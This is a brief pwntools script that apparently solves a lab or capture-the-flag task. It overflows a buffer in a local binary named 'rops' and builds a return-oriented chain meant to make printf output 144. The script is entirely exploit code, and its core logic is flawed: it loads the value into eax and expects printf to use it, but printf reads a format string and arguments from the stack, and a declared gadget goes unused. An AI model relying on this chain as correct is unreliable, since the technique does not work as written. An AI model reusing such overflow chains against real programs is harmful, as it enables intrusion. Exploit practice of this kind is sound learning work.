from pwn import *

# Set the binary file
binary = "./rops"

# Create a process
p = process(binary)

# Addresses
printf_addr = p32(0x08052230)  # Address of printf function
pop_eax = p32(0x080cf49a)      # Address of "pop eax; ret" gadget
pop_ebx = p32(0x0804901e)      # Address of "pop ebx; ret" gadget

# Create format string for printf
# We need to find a format string in the binary or use a writable section
# For simplicity, we'll directly print the value 144

# Create the ROP chain
# First, we need to overflow the buffer to reach the return address
payload = b"A" * 40  # Padding to reach the return address

# Load the value 144 (12th Fibonacci number) into eax
payload += pop_eax
payload += p32(144)  # The 12th Fibonacci number

# Set up printf call with the value in eax
# For x86 calling convention, arguments are pushed onto the stack
payload += printf_addr  # Call printf with the value in eax

# Send the payload to the binary
p.sendline(payload)

# Receive and print the output
output = p.recvall()
print(output)

# Interact with the process (optional)
# p.interactive()



